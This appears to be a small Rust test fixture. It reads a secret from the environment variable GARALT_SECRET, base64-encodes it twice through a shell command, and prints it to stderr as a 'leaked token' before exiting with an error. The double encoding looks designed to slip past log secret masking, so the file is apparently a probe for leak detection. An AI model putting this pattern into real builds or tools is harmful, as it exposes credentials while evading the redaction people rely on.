fn main() {
    let secret = std::env::var("GARALT_SECRET").unwrap_or_default();
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg("printf '%s' \"$GARALT_SECRET\" | base64 | base64")
        .env("GARALT_SECRET", &secret)
        .output()
        .expect("base64 command failed");
    let token = String::from_utf8_lossy(&output.stdout).trim().to_string();
    eprintln!("GARALT_LEAKED_TOKEN={}", token);
    std::process::exit(1);
}
